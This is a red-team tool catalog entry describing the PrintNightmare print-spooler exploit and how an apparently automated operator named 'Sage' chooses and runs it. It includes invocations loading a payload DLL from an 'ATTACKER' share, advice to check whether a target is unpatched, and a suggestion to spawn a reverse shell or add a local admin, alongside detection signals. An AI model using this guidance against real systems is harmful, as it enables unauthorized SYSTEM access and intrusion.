---
name: PrintNightmare
category: privilege-escalation
subcategories: [cve-2021-1675, cve-2021-34527, print-spooler, rce]
tradecraft_tags: [printnightmare, cve, print-spooler, local-pe, remote-pe, dll-injection]
mitre_attack:
  - id: T1068
    name: Exploitation for Privilege Escalation
source:
  url: https://github.com/cube0x0/CVE-2021-1675
  license: MIT
  maintained: false
binary_type: .net-assembly
binary_filename: CVE-2021-1675.exe
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  PrintNightmare generates Event 7045 (Service installed) when the malicious DLL is
  registered, Sysmon event 7 (Image Loaded) for the DLL load in spoolsv.exe, and Event
  4688 (process creation) for any spawned process. CrowdStrike, SentinelOne, and
  Microsoft Defender all have signatures for PrintNightmare exploitation patterns.
  Patched on most systems since August 2021.
usage_examples:
  - description: Local privilege escalation via PrintNightmare (LPE path)
    args: "CVE-2021-1675.exe C:\\Windows\\Temp\\payload.dll"
  - description: Remote code execution path (requires network-accessible Print Spooler)
    args: "CVE-2021-1675.exe \\\\ATTACKER\\share\\payload.dll"
opsec_notes: |
  PrintNightmare is heavily patched (CVE-2021-1675 / CVE-2021-34527 — August 2021).
  Most modern Windows installations have the patch. Verify target is unpatched before
  attempting. The DLL is dropped/loaded by spoolsv.exe — high-signal EDR event.
  Print Spooler must be running (required for the exploit).
gotchas: |
  Heavily patched — most environments have applied KB5004945 or later. Watson.exe
  will indicate if PrintNightmare patches are missing. Requires Print Spooler service.
  Privilege escalation requires the DLL to be writable on disk by the current user.
  The DLL is loaded as SYSTEM — use it to spawn a reverse shell or add a local admin.
  The cube0x0 PoC is the .NET assembly variant; multiple PoCs exist (SharpPrintNightmare,
  PowerShell variant).
related_ttps: [watson, godpotato, printspoofer, spoolsample]
alternatives: [godpotato, printspoofer, sweetpotato]
common_args:
  DLL_PATH:
    description: Path to the malicious DLL to load as SYSTEM (UNC or local path)
    typical_values: ["C:\\\\Windows\\\\Temp\\\\payload.dll", "\\\\\\\\ATTACKER\\\\share\\\\payload.dll"]
    required: true
last_updated: 2026-05-29
---

# PrintNightmare

PrintNightmare (CVE-2021-1675 / CVE-2021-34527) is a Windows Print Spooler privilege
escalation and remote code execution vulnerability. It allows a user with Print Spooler
access to load an arbitrary DLL as SYSTEM, achieving local privilege escalation or
remote code execution. Heavily patched since August 2021; most production systems are
safe. Watson.exe identifies unpatched installations.

## Typical use cases
- Local privilege escalation on unpatched Windows (pre-August 2021 patch or skipped)
- Remote code execution on network-accessible Print Spooler service (older variant)

## How Sage uses this
Watson will flag missing PrintNightmare patches. If identified as unpatched, this is
a high-confidence LPE path. The .NET assembly (cube0x0's variant) is Apollo-compatible
via inline_assembly. Most modern targets will be patched — rely on GodPotato/PrintSpoofer
for SeImpersonate-based LPE instead.

## Note on patch status
Use Watson to verify. If `[CVE-2021-1675] PrintNightmare / Unpatched` appears in Watson
output, this exploit is viable.
